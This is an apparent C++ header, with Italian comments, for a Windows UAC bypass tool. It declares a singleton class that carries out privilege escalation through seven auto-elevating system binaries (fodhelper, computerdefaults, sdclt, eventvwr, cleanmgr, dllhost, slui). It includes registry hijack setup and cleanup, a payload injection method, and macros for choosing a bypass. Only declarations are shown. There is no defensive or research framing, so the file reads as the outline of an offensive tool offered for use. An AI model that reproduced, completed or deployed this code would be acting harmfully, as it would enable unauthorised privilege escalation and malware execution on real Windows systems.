#ifndef UAC_BYPASS_METHODS_H
#define UAC_BYPASS_METHODS_H
#include <windows.h>
#include <string>
#include <vector>
#include <map>
#include "Logger.h"
#include "Config.h"

namespace uac_bypass {

// Enumerazione dei metodi di bypass disponibili
enum class BypassMethod {
    FODHELPER,              // Metodo fodhelper.exe
    COMPUTERDEFAULTS,       // Metodo computerdefaults.exe
    SDCLT,                  // Metodo sdclt.exe
    EVENT_VIEWER,          // Metodo eventvwr.exe
    DISK_CLEANUP,          // Metodo cleanmgr.exe
    COM_SURROGATE,         // Metodo dllhost.exe
    SLUI                   // Metodo slui.exe
};

// Struttura per i dettagli del metodo di bypass
struct BypassDetails {
    std::wstring processName;
    std::wstring registryKey;
    std::wstring registryValue;
    std::wstring commandValue;
    bool requiresCleanup;
    bool usesCOM;
};

// Costanti per i timeout
#define PROCESS_TIMEOUT 30000  // 30 secondi
#define REGISTRY_TIMEOUT 5000  // 5 secondi

class BypassMethods {
public:
    static BypassMethods& getInstance();
    
    // Metodi principali
    bool initializeMethod(BypassMethod method);
    bool executeBypass(BypassMethod method);
    bool cleanup(BypassMethod method);
    
    // Gestione metodi
    std::vector<BypassMethod> getAvailableMethods();
    bool isMethodAvailable(BypassMethod method);
    BypassDetails getMethodDetails(BypassMethod method);
    
    // Verifica e backup
    bool verifyMethod(BypassMethod method);
    bool backupRegistry(BypassMethod method);
    bool restoreRegistry(BypassMethod method);

private:
    BypassMethods();  // Singleton
    ~BypassMethods();
    
    BypassMethods(const BypassMethods&) = delete;
    BypassMethods& operator=(const BypassMethods&) = delete;

    // Implementazioni specifiche
    bool bypassFodhelper();
    bool bypassComputerDefaults();
    bool bypassSdclt();
    bool bypassEventViewer();
    bool bypassDiskCleanup();
    bool bypassComSurrogate();
    bool bypassSlui();
    
    // Utility interne
    bool setupRegistry(const BypassDetails& details);
    bool cleanupRegistry(const BypassDetails& details);
    bool createProcess(const std::wstring& processName);
    bool injectPayload(HANDLE hProcess);
    
    // Verifica ambiente
    bool isProcessAvailable(const std::wstring& processName);
    bool isRegistryAccessible(const std::wstring& keyPath);
    bool verifyProcessIntegrity(const std::wstring& processPath);
    
    // Membri privati
    Logger& logger;
    std::map<BypassMethod, BypassDetails> methodDetails;
    std::map<BypassMethod, std::wstring> backupPaths;
    bool initialized;
};

// Macro per selezione metodo di bypass
#define USE_BYPASS_METHOD(method) \
    BypassMethods::getInstance().executeBypass(method)

// Macro per verifica disponibilità
#define IS_BYPASS_AVAILABLE(method) \
    BypassMethods::getInstance().isMethodAvailable(method)

// Macro per cleanup automatico
#define CLEANUP_BYPASS(method) \
    BypassMethods::getInstance().cleanup(method)

} // namespace uac_bypass

#endif // UAC_BYPASS_METHODS_H